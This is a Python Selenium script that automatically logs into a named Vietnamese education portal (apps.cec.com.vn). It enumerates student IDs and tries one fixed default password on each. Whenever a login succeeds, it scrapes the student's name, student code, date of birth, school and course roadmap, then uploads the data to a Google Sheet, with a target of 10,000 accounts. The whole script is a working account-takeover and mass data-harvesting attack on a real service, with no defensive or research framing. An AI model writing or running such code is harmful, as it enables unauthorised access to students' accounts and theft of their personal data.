from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import gspread
from oauth2client.service_account import ServiceAccountCredentials
import os
import json
import re

# Configuration from file
config = {
    "start_id": "59555HN",
    "direction": "decrease",
    "password": "1234567",
    "max_consecutive_fails": 100,
    "step_sizes": [1, 10, 100, 1000],
    "target_valid_ids": 10000
}


def generate_next_id(current_id, direction, step):
    """Generate the next ID based on direction and step size."""
    match = re.match(r"(\d+)([A-Z]+)", current_id)
    if not match:
        raise ValueError(f"Invalid ID format: {current_id}")

    number, suffix = match.groups()
    number = int(number)

    if direction == "decrease":
        next_number = number - step
    else:
        next_number = number + step

    if next_number < 0:
        raise ValueError("ID number cannot go below 0")

    return f"{next_number}{suffix}"


def clear_browser_cache(driver):
    """Clear browser cookies and cache."""
    try:
        driver.delete_all_cookies()
        driver.execute_script("window.localStorage.clear();")
        driver.execute_script("window.sessionStorage.clear();")
        with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Browser cache and cookies cleared.\n")
    except Exception as e:
        with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Error clearing cache: {str(e)}\n")


# Set up Selenium WebDriver
options = webdriver.ChromeOptions()
# options.add_argument('--headless')  # Uncomment for GitHub Actions
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

# Initialize variables
consecutive_fails = 0
valid_ids_found = 0
current_id = config["start_id"]
password = config["password"]
step_index = 0
step_sizes = config["step_sizes"]
max_consecutive_fails = config["max_consecutive_fails"]
target_valid_ids = config["target_valid_ids"]

# Check for credentials.json
credentials_file = "credentials.json"
if not os.path.exists(credentials_file):
    github_credentials = os.getenv("GOOGLE_CREDENTIALS")
    if github_credentials:
        with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
            f.write(
                f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Using GOOGLE_CREDENTIALS from environment (GitHub Actions)\n")
        with open(credentials_file, "w", encoding="utf-8") as f:
            json.dump(json.loads(github_credentials), f)
    else:
        error_msg = f"Google Sheets credentials file '{credentials_file}' not found."
        with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {error_msg}\n")
        raise FileNotFoundError(error_msg)

# Set up Google Sheets API
with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Setting up Google Sheets API...\n")
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
creds = ServiceAccountCredentials.from_json_keyfile_name(credentials_file, scope)
client = gspread.authorize(creds)

# Open the Google Sheet
sheet_id = "1-MMsbAGlg7MNbBPAzioqARu6QLfry5mCrWJ-Q_aqmIM"
try:
    sheet = client.open_by_key(sheet_id).sheet1
    # Write headers only if the sheet is empty
    if not sheet.get_all_values():
        headers = ["Username", "Học sinh", "Mã học sinh", "DOB", "Start date", "Trường học", "Nhân viên tư vấn",
                   "Date", "Note", "Course Name", "Level", "Duration", "Final Commitment"]
        sheet.append_row(headers)
        with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Wrote headers to Google Sheet\n")
except gspread.exceptions.SpreadsheetNotFound:
    error_msg = f"Google Sheet with ID '{sheet_id}' not found or not accessible."
    with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {error_msg}\n")
    raise Exception(error_msg)

try:
    while valid_ids_found < target_valid_ids and consecutive_fails < max_consecutive_fails:
        with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
            f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] Attempting login with ID: {current_id}\n")
        try:
            clear_browser_cache(driver)
            driver.get("https://apps.cec.com.vn/login")

            username_field = WebDriverWait(driver, 20).until(
                EC.visibility_of_element_located((By.ID, "input-14"))
            )
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Entering username: {current_id}\n")
            username_field.clear()
            username_field.send_keys(current_id)

            password_field = WebDriverWait(driver, 20).until(
                EC.visibility_of_element_located((By.ID, "input-18"))
            )
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Entering password...\n")
            password_field.clear()
            password_field.send_keys(password)

            login_button = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.XPATH, "//button[@type='submit']"))
            )
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Clicking login button...\n")
            login_button.click()

            # Check for login failure (e.g., error message)
            try:
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located(
                        (By.XPATH, "//*[contains(text(), 'The account or password you enter is not correct')]"))
                )
                with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                    f.write(
                        f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Login failed for ID {current_id}: The account or password is incorrect\n")
                consecutive_fails += 1
                if consecutive_fails % 10 == 0 and step_index < len(step_sizes) - 1:
                    step_index += 1
                    with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                        f.write(
                            f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Increasing step size to {step_sizes[step_index]} due to {consecutive_fails} consecutive fails.\n")
                current_id = generate_next_id(current_id, config["direction"], step_sizes[step_index])
                continue
            except:
                pass  # No login error, proceed

            WebDriverWait(driver, 30).until_not(
                EC.url_contains("login")
            )
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Current URL after login: {driver.current_url}\n")

            driver.get("https://apps.cec.com.vn/student-roadmap/overview")
            WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CLASS_NAME, "roadmap-container"))
            )
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Current URL after navigation: {driver.current_url}\n")

            # Extract student information
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Extracting student information...\n")
            student_info = {}
            info_elements = driver.find_elements(By.XPATH, "//div[@class='list-info']//div[@class='item']")
            for item in info_elements:
                label = item.find_element(By.TAG_NAME, "h4").text.strip()
                value = item.find_element(By.XPATH, "./div[@class='row']/div[2]").text.strip()
                student_info[label] = value

            username_elements = driver.find_elements(By.XPATH, "//p[contains(@class, 'fs-18 font-weight-bold')]")
            username = username_elements[0].text.strip().replace("Hi, ", "") if username_elements else current_id

            # Extract roadmap details
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Extracting roadmap details...\n")
            roadmap_entries = []
            roadmap_elements = driver.find_elements(By.XPATH, "//div[@class='roadmap']//div[@style='display: flex;']")
            for entry in roadmap_elements:
                date = entry.find_element(By.CLASS_NAME, "date").text.strip()
                note = entry.find_element(By.CLASS_NAME, "note").text.strip()
                subtext = entry.find_element(By.CLASS_NAME, "subtext").text.strip()
                course_info = entry.find_elements(By.XPATH, ".//div[@class='rectangle']/p")
                course_name = course_info[0].text.strip()
                level = course_info[1].text.strip()
                roadmap_entries.append({
                    "Date": date,
                    "Note": note,
                    "Course Name": course_name,
                    "Level": level,
                    "Duration": subtext
                })

            final_commitment_elements = driver.find_elements(By.CLASS_NAME, "final")
            final_commitment = final_commitment_elements[0].text.strip() if final_commitment_elements else "Unknown"

            # Write to text file
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Writing data for ID {current_id}...\n")
                f.write("Student Information:\n")
                f.write(f"Username: {username}\n")
                for key, value in student_info.items():
                    f.write(f"{key}: {value}\n")
                f.write("\nRoadmap Details:\n")
                for entry in roadmap_entries:
                    f.write(f"Date: {entry['Date']}\n")
                    f.write(f"Note: {entry['Note']}\n")
                    f.write(f"Course Name: {entry['Course Name']}\n")
                    f.write(f"Level: {entry['Level']}\n")
                    f.write(f"Duration: {entry['Duration']}\n")
                    f.write("\n")
                f.write(f"Final Commitment: {final_commitment}\n")
                f.write("\n" + "=" * 50 + "\n")

            # Append to Google Sheet
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Uploading to Google Sheet for ID {current_id}...\n")
            for entry in roadmap_entries:
                row = [
                    username,
                    student_info.get("Học sinh", ""),
                    student_info.get("Mã học sinh", ""),
                    student_info.get("DOB", ""),
                    student_info.get("Start date", ""),
                    student_info.get("Trường học", ""),
                    student_info.get("Nhân viên tư vấn", ""),
                    entry["Date"],
                    entry["Note"],
                    entry["Course Name"],
                    entry["Level"],
                    entry["Duration"],
                    final_commitment
                ]
                sheet.append_row(row)

            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Data successfully uploaded for ID: {current_id}\n")
            valid_ids_found += 1
            consecutive_fails = 0
            step_index = 0

        except Exception as e:
            error_msg = f"Error occurred for ID {current_id}: {str(e)}"
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {error_msg}\n")
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Current URL: {driver.current_url}\n")
                f.write(
                    f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Page source at failure:\n{driver.page_source[:1000]}...\n")
            driver.save_screenshot(f"error_screenshot_{current_id}.png")
            consecutive_fails += 1
            if consecutive_fails >= max_consecutive_fails:
                with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                    f.write(
                        f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Reached maximum consecutive fails ({max_consecutive_fails}). Stopping.\n")
                break
            if consecutive_fails % 10 == 0 and step_index < len(step_sizes) - 1:
                step_index += 1
                with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                    f.write(
                        f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Increasing step size to {step_sizes[step_index]} due to {consecutive_fails} consecutive fails.\n")

        try:
            current_id = generate_next_id(current_id, config["direction"], step_sizes[step_index])
        except ValueError as e:
            with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Error generating next ID: {str(e)}\n")
            break

finally:
    with open("student_roadmap_log.txt", "a", encoding="utf-8") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Closing browser...\n")
    driver.quit()
